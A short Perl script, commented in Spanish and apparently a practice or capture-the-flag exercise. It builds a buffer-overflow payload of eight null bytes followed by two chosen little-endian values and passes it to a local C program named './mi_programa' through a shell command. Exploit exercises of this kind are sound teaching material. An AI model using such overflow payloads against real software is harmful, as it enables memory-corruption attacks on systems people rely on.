#!/usr/bin/perl

# Valores específicos para val1 y val2
my $val1 = 1818390343;
my $val2 = 1917480553;

# Convertir los valores a formato little endian
my $val1_le = pack('L<', $val1);
my $val2_le = pack('L<', $val2);

# Construir el payload para el desbordamiento de búfer
my $payload = pack('C*', (0) x 8);     # Rellena el buffer con 8 bytes nulos
$payload .= $val1_le;                  # Agrega el valor de val1 en formato little endian
$payload .= $val2_le;                  # Agrega el valor de val2 en formato little endian

# Ejecutar el programa C con el payload como argumento
my $programa = './mi_programa';        # Ruta al programa compilado
my $comando = "$programa \"$payload\""; # Comando para ejecutar el programa con el payload
my $resultado = `$comando`;

print $resultado;
